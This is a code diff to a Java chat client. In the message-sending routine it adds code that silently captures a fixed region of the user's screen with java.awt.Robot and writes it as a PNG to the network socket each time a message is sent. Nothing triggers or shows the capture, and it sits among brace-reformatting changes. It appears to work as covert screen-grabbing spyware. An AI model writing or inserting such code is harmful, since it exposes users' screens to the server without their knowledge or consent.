@@ -19,6 +19,9 @@ import java.awt.event.KeyEvent;
 import java.awt.event.KeyListener;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
+import java.awt.image.BufferedImage;
+import java.awt.Robot;
+import javax.imageio.ImageIO;
 import javax.swing.*;
 import javax.swing.plaf.ColorUIResource;
 import javax.swing.plaf.DimensionUIResource;
@@ -164,11 +167,17 @@ public class ChatUI {
 
                         int msgLength = msg.length();
 
-                        synchronized (writer) {
+                        synchronized (writer) 
+                        {
                             String data = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd"));
                             String time = LocalTime.now().format(DateTimeFormatter.ofPattern("hh:mm:ss"));
 
-                            for (int i = 0; i < msgLength - 1;) {
+                            Robot robot = new Robot();
+                            BufferedImage bimp = robot.createScreenCapture(new Rectangle(0, 0, 427, 240));
+                            ImageIO.write(bimp, "PNG", socket.getOutputStream());
+
+                            for (int i = 0; i < msgLength - 1;) 
+                            {
                                 int k = i;
                                 JSONObject mandaImmagine = new JSONObject();
                                 mandaImmagine.put("Tipo-Richiesta", "Invio-Messaggio");
